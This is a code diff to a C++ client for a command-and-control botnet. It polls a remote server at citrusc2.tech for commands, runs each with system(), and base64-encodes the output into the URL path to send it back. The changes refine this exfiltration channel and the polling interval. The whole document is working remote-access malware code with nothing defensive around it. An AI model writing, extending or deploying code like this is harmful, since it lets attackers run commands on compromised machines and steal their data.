@@ -34,7 +34,7 @@ const std::string c2_register_url = "http://citrusc2.tech/bot/register/windows/"
 #endif
 
 std::string c2_poll_url = "http://citrusc2.tech/bot/poll";
-std::string c2_results_url = "http://citrusc2.tech/out";
+std::string c2_results_url = "http://citrusc2.tech/cmdout/";
 
 
 
@@ -168,7 +168,7 @@ void client_work() {
             exit(EXIT_FAILURE);
         }
 
-        std::cout << "Command read:\n" << command_json << std::endl;
+        std::cout << "Command json read:\n" << command_json << std::endl;
 
         rapidjson::Document command_document;
         command_document.Parse(command_json.c_str());
@@ -182,7 +182,7 @@ void client_work() {
         std::cout << command << std::endl;
 
         //Pipe output of command to file
-        command += " > ./output.txt";
+        command += " | base64 > ./output.txt";
 
         //Execute work
         int status = system(command.c_str());
@@ -212,11 +212,31 @@ void client_work() {
         curl_slist *post_header_list = nullptr;
         post_header_list = curl_slist_append(post_header_list, post_header.c_str());
 
+        std::string full_c2_result_url = c2_results_url;
+        bytes.erase(std::remove(bytes.begin(), bytes.end(), '\n'), bytes.end());
+
+        unsigned equal_signs_removed = 0;
+        while (!bytes.empty() && bytes.back() == '=') {
+            bytes.pop_back();
+            equal_signs_removed += 1;
+        }
+        bytes.push_back('0' + equal_signs_removed);
+        full_c2_result_url += bytes;
+
+        std::cout << "URL:" << full_c2_result_url << std::endl;
+
         curl_easy_setopt(curl, CURLOPT_VERBOSE, true);
-        curl_easy_setopt(curl, CURLOPT_URL, c2_results_url.c_str());
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, bytes.data());
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, bytes.size());
+        //curl_easy_setopt(curl, CURLOPT_URL, c2_results_url.c_str());
+        curl_easy_setopt(curl, CURLOPT_URL, full_c2_result_url.c_str());
+        curl_easy_setopt(curl, CURLOPT_POST, true);
+        //curl_easy_setopt(curl, CURLOPT_POSTFIELDS, bytes.data());
+        //curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, bytes.size());
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, nullptr);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, 0);
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_header_list);
+
+        //curl_easy_setopt(curl, CURLOPT_READDATA, &bytes);
+        //curl_easy_setopt(curl, CURLOPT_READFUNCTION, &read_callback);
 
         //curl_mime* form = curl_mime_init(curl);
         //curl_mimepart* field = curl_mime_addpart(form);
@@ -224,12 +244,12 @@ void client_work() {
         //curl_mime_name(field, "output");
         //curl_mime_filedata(field, bytes.c_str());
 
-        //curl_easy_setopt(curl, CURLOPT_READDATA, &bytes);
-        //curl_easy_setopt(curl, CURLOPT_READFUNCTION, &read_callback);
         //curl_easy_setopt(curl, CURLOPT_WRITEDATA, &bytes);
         //curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
 
         result = curl_easy_perform(curl);
+
+        curl_slist_free_all(post_header_list);
 
         if (result != CURLE_OK) {
             std::cerr << "GET request failed:" << std::endl;
@@ -237,7 +257,7 @@ void client_work() {
             exit(EXIT_FAILURE);
         }
 
-        std::this_thread::sleep_for(1000ms);
+        std::this_thread::sleep_for(5000ms);
     }
 }
 
